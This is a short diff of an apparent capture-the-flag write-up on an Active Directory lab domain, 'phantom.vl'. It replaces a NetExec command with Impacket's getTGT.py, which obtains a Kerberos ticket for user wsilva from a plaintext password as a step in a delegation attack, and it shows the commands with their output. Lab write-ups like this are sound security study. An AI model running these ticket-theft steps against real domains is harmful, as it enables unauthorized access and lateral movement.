@@ -682,11 +682,10 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 First ill read the attribute then write to it to set the delegation
 
 ```python
-nxc smb dc.phantom.vl -d phantom.vl -u wsilva -p 'Password123!' --generate-tgt wsilva
-SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:Password123! 
-SMB         10.129.234.63   445    DC               [+] TGT saved to: wsilva.ccache
-SMB         10.129.234.63   445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=wsilva.ccache
+getTGT.py phantom.vl/wsilva:'Password123!' 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in wsilva.ccache
 ```
 
 Then ill grab a TGT for the user configured for delegation
